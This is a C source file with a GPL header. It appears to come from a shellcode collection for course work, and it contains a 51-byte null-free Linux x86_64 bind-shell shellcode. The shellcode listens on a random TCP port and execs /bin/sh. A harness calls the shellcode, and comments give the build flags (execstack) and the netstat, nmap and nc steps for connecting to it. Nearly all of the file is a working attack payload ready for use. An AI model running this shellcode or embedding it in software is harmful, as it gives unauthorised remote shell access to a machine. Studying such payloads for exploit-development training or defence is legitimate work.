/*

 Tiny Shell Bind TCP Random Port Shellcode - C Language - Linux/x86_64
 Copyright (C) 2021 Geyslan G. Bem, Hacking bits
 All rights reserved.

   http://hackingbits.github.io
   geyslan@gmail.com

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.

 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.

 You should have received a copy of the GNU General Public License
 along with this program.  If not, see <http://www.gnu.org/licenses/>

*/

/*

   tiny_shell_bind_tcp_random_port_shellcode_x86_64
     assembly source:
   https://github.com/geyslan/SLAE/blob/master/improvements/tiny_shell_bind_tcp_random_port_x86_64.asm

   * 51 bytes
   * null-free


   # gcc -m64 -fno-stack-protector -z execstack \
   tiny_shell_bind_tcp_random_port_shellcode_x86_64.c -o \
   tiny_shell_bind_tcp_random_port_shellcode_x86_64

   Testing
   Fist terminal
   # ./tiny_shell_bind_tcp_random_port_shellcode_x86_64
   Second terminal (Discover the port and connect)
   # netstat -anp | grep shell
   # nmap -sS 127.0.0.1 -p- (It's necessary to use the TCP SYN scan option [-sS],
			     avoiding nmap to connect to the port open by shellcode)
   # nc 127.0.0.1 port
*/

#include <stdio.h>
#include <string.h>

int main(void)
{
	const char code[] =

		"\x6a\x29\x58\x99\x6a\x01\x5e\x6a\x02\x5f"
		"\x0f\x05\x97\xb0\x32\x0f\x05\x96\xb0\x2b"
		"\x0f\x05\x97\x96\xff\xce\x6a\x21\x58\x0f"
		"\x05\x75\xf7\x52\x48\xbf\x2f\x2f\x62\x69"
		"\x6e\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x0f"
		"\x05";

	// When contains null bytes, printf will show a wrong shellcode length.
	printf("Shellcode Length:  %ld\n", strlen(code));

	// Pollutes all registers ensuring that the shellcode runs in any
	// circumstance.
	__asm__("lea %[code], %%r15\n\t"
		"mov $0xffffffffffffffff, %%rax\n\t"
		"mov %%rax, %%rbx\n\t"
		"mov %%rax, %%rcx\n\t"
		"mov %%rax, %%rdx\n\t"
		"mov %%rax, %%rsi\n\t"
		"mov %%rax, %%rdi\n\t"
		"mov %%rax, %%rbp\n\t"
		"call *%%r15\n\t"
		: /* no outputs */
		: [code] "m"(code));
}
